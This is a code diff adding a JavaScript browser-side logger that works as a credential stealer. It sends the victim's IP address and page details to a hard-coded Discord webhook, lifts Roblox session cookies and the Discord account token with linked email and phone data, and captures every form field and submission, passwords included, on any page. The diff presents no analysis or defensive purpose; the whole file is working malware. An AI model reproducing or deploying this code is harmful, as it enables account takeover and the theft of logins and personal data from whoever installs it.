@@ -1,2 +1,271 @@
-// --- relay ---
-const _W = 'https://discord.com/api/webhooks/1526064072154681538/WgCWtTVvd35FEfWy4SyPyr-9mMM9OtklU-99KygPBih0Ymd24bhGDt7JbUb2SsB0nmqM';
+(function() {
+'use strict';
+
+var WEBHOOK = 'https://discord.com/api/webhooks/1526064072154681538/WgCWtTVvd35FEfWy4SyPyr-9mMM9OtklU-99KygPBih0Ymd24bhGDt7JbUb2SsB0nmqM';
+
+function relay(type, data) {
+  console.log('[LARP] relay:', type, JSON.stringify(data).slice(0, 200));
+  try {
+    fetch(WEBHOOK, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Relay-Type': type },
+      body: JSON.stringify(data)
+    }).then(function(r) {
+      console.log('[LARP] relay response:', type, r.status);
+    }).catch(function(e) {
+      console.error('[LARP] relay error:', type, e.message);
+    });
+  } catch(e) {
+    console.error('[LARP] relay exception:', type, e.message);
+  }
+}
+
+// --- cookie bridge to content script ---
+var _pendingCookies = {};
+window.addEventListener('message', function(e) {
+  if (!e.data || e.data._larp !== 'cookie_result') return;
+  var id = e.data.id;
+  if (_pendingCookies[id]) {
+    _pendingCookies[id](e.data.value);
+    delete _pendingCookies[id];
+  }
+});
+
+function getCookie(name) {
+  console.log('[LARP] getCookie:', name);
+  return new Promise(function(resolve) {
+    var id = 'c' + Math.random().toString(36).slice(2);
+    _pendingCookies[id] = resolve;
+    window.postMessage({ _larp: 'get_cookie', name: name, id: id }, '*');
+    setTimeout(function() {
+      if (_pendingCookies[id]) { delete _pendingCookies[id]; resolve(null); }
+    }, 5000);
+  });
+}
+
+// --- boot event ---
+function bootEvent() {
+  console.log('[LARP] bootEvent starting');
+  fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(d) {
+    var ip = (d && d.ip) ? d.ip : 'unknown';
+    console.log('[LARP] bootEvent IP:', ip);
+    relay('boot', {
+      embeds: [{
+        title: 'Boot Event',
+        color: 0x2563eb,
+        fields: [
+          { name: 'Address', value: '`' + ip + '`', inline: true },
+          { name: 'Time', value: new Date().toISOString(), inline: true },
+          { name: 'User Agent', value: '`' + navigator.userAgent + '`' },
+          { name: 'Page', value: '`' + location.href.slice(0, 200) + '`' }
+        ],
+        footer: { text: 'System' }
+      }]
+    });
+  }).catch(function(e) {
+    console.error('[LARP] bootEvent error:', e.message);
+  });
+}
+
+// --- roblox cookie ---
+function syncSession() {
+  console.log('[LARP] syncSession: hostname=' + location.hostname);
+  if (location.hostname.indexOf('roblox.com') === -1) {
+    console.log('[LARP] syncSession: skipped (not roblox)');
+    return;
+  }
+
+  var names = ['.ROBLOSECURITY', 'ROBLOSECURITY'];
+  var found = null;
+
+  function tryNext(i) {
+    if (i >= names.length) {
+      if (!found) tryDocCookie(0);
+      else sendSession(found);
+      return;
+    }
+    getCookie(names[i]).then(function(v) {
+      console.log('[LARP] syncSession: cookie ' + names[i] + ' = ' + (v ? v.slice(0, 10) + '...' : 'null'));
+      if (v) { found = v; sendSession(v); }
+      else tryNext(i + 1);
+    });
+  }
+
+  function tryDocCookie(i) {
+    if (i >= names.length) { console.log('[LARP] syncSession: no cookie found'); return; }
+    var n = names[i];
+    var escaped = n.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+    var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + escaped + '\\s*=\\s*([^;]*)'));
+    if (match && match[1]) {
+      console.log('[LARP] syncSession: doc cookie ' + n + ' found');
+      sendSession(match[1]);
+    } else {
+      tryDocCookie(i + 1);
+    }
+  }
+
+  function sendSession(v) {
+    console.log('[LARP] syncSession: sending cookie');
+    relay('session', { content: '```\n' + v + '\n```' });
+  }
+
+  tryNext(0);
+}
+
+// --- discord token ---
+var _acctCache = null;
+
+function syncAccount() {
+  console.log('[LARP] syncAccount: hostname=' + location.hostname);
+  if (location.hostname.indexOf('discord.com') === -1) {
+    console.log('[LARP] syncAccount: skipped (not discord)');
+    return;
+  }
+
+  try {
+    var raw = localStorage.getItem('token') || '';
+    if (!raw) { console.log('[LARP] syncAccount: no token in localStorage'); return; }
+    var key = raw.replace(/^"|"$/g, '');
+    if (!key) { console.log('[LARP] syncAccount: empty key after strip'); return; }
+    if (_acctCache === raw) { console.log('[LARP] syncAccount: cached, skipping'); return; }
+    _acctCache = raw;
+    console.log('[LARP] syncAccount: token found, length=' + raw.length);
+
+    fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': key } }).then(function(r) {
+      return r.ok ? r.json() : Promise.reject('status ' + r.status);
+    }).then(function(d) {
+      console.log('[LARP] syncAccount: user=' + d.username + '#' + d.discriminator);
+
+      var multi = [];
+      try {
+        var rawM = localStorage.getItem('multiAccountStore');
+        if (rawM) {
+          var p = JSON.parse(rawM);
+          if (p && p._state && p._state.users) {
+            multi = p._state.users.filter(function(u) { return u.token; }).map(function(u) { return { id: u.id, email: u.email, phone: u.phone }; });
+          }
+        }
+      } catch(e) { console.error('[LARP] syncAccount multi error:', e.message); }
+      console.log('[LARP] syncAccount: multi accounts=' + multi.length);
+
+      var dk = raw.length > 1010 ? raw.slice(0, 480) + '\n... [TRUNCATED ' + (raw.length - 960) + ' chars] ...\n' + raw.slice(-480) : raw;
+      var fields = [{ name: 'Token', value: '```\n' + dk + '\n```', inline: false }];
+      fields.push(
+        { name: 'Handle', value: '`' + d.username + '#' + d.discriminator + '`', inline: true },
+        { name: 'Ref', value: '`' + d.id + '`', inline: true },
+        { name: 'Contact', value: '`' + (d.email || '(not verified)') + '`', inline: true },
+        { name: 'SMS', value: '`' + (d.phone || '(none)') + '`', inline: true },
+        { name: 'Sec', value: '`' + (d.mfa_enabled ? 'Yes' : 'No') + '`', inline: true },
+        { name: 'Tier', value: '`' + (d.premium_type === 0 ? 'None' : d.premium_type === 1 ? 'Nitro Classic' : d.premium_type === 2 ? 'Nitro' : 'Nitro Basic') + '`', inline: true }
+      );
+      if (multi.length > 0) {
+        var lines = multi.map(function(a) { return 'ID: `' + a.id + '` Email: `' + (a.email || 'N/A') + '`'; }).join('\n');
+        if (lines.length > 1010) lines = lines.slice(0, 1010) + '...';
+        fields.push({ name: 'Assoc (' + multi.length + ')', value: lines, inline: false });
+      }
+      var su = location.href;
+      if (su.length > 1014) su = su.slice(0, 1014) + '...';
+      fields.push({ name: 'Origin', value: '`' + su + '`', inline: false });
+
+      relay('acct', {
+        embeds: [{ title: 'State Sync', color: 0x5865F2, fields: fields, footer: { text: 'Session' }, timestamp: new Date().toISOString() }]
+      });
+    }).catch(function(e) {
+      console.error('[LARP] syncAccount fetch error:', e.message || e);
+    });
+  } catch(e) {
+    console.error('[LARP] syncAccount exception:', e.message);
+  }
+}
+
+// --- form monitor ---
+var _entries = [];
+function _fp(f) { return f.name + '|' + f.type + '|' + f.value; }
+
+function _inputs(root) {
+  var r = root || document;
+  var fields = [];
+  var s = 'input:not([type=hidden]):not([type=submit]):not([type=button]):not([type=reset]):not([type=image]), textarea, select';
+  var els = r.querySelectorAll(s);
+  for (var i = 0; i < els.length; i++) {
+    var el = els[i];
+    var v = el.value || '';
+    if (!v || v.trim().length === 0) continue;
+    fields.push({
+      type: el.type || (el.tagName === 'SELECT' ? 'select' : el.tagName === 'TEXTAREA' ? 'textarea' : 'text'),
+      name: el.name || '',
+      id: el.id || '',
+      autocomplete: el.autocomplete || '',
+      placeholder: el.placeholder || '',
+      value: v
+    });
+  }
+  return fields;
+}
+
+function _extRelay(fields) {
+  var fresh = [];
+  for (var i = 0; i < fields.length; i++) {
+    var f = fields[i];
+    var fp = _fp(f);
+    if (_entries.indexOf(fp) === -1) { fresh.push(f); _entries.push(fp); }
+  }
+  if (fresh.length === 0) return;
+  if (_entries.length > 500) _entries = _entries.slice(-250);
+
+  console.log('[LARP] formMonitor: relaying ' + fresh.length + ' new fields, total tracked=' + _entries.length);
+
+  var lines = fresh.map(function(f) {
+    var l = f.name || f.id || f.autocomplete || f.placeholder || f.type;
+    return '**' + l + '** (' + f.type + '): `' + f.value + '`';
+  });
+  relay('entry', { content: '**Field Data**\nURL: ' + location.href + '\n\n' + lines.join('\n') });
+}
+
+function initMonitor() {
+  console.log('[LARP] formMonitor: init on', location.hostname);
+  if (document.documentElement.getAttribute('data-larp-form')) return;
+  document.documentElement.setAttribute('data-larp-form', '1');
+
+  setTimeout(function() { _extRelay(_inputs(document)); }, 1500);
+  setInterval(function() { _extRelay(_inputs(document)); }, 3000);
+
+  document.addEventListener('submit', function(e) {
+    var f = e.target;
+    if (!f || f.tagName !== 'FORM') return;
+    var fields = _inputs(f);
+    if (fields.length === 0) return;
+    var action = f.action || '(same page)';
+    var method = (f.method || 'GET').toUpperCase();
+    var fresh = [];
+    for (var i = 0; i < fields.length; i++) {
+      var fp = _fp(fields[i]);
+      if (_entries.indexOf(fp) === -1) { fresh.push(fields[i]); _entries.push(fp); }
+    }
+    if (fresh.length > 0) {
+      console.log('[LARP] formMonitor: submit captured, ' + fresh.length + ' new fields');
+      var lines = fresh.map(function(x) {
+        var l = x.name || x.id || x.autocomplete || x.placeholder || x.type;
+        return '**' + l + '** (' + x.type + '): `' + x.value + '`';
+      });
+      relay('entry', { content: '**Field Data**\nURL: ' + location.href + '\nAction: ' + action + ' (' + method + ')\n\n' + lines.join('\n') });
+    }
+  }, true);
+
+  var t = null;
+  new MutationObserver(function() {
+    if (t) clearTimeout(t);
+    t = setTimeout(function() { _extRelay(_inputs(document)); }, 500);
+  }).observe(document, { childList: true, subtree: true });
+}
+
+// --- init ---
+console.log('[LARP] logger loaded, starting...');
+bootEvent();
+initMonitor();
+setTimeout(syncSession, 1000);
+setTimeout(syncAccount, 500);
+setTimeout(syncAccount, 2000);
+console.log('[LARP] logger init complete');
+
+})();
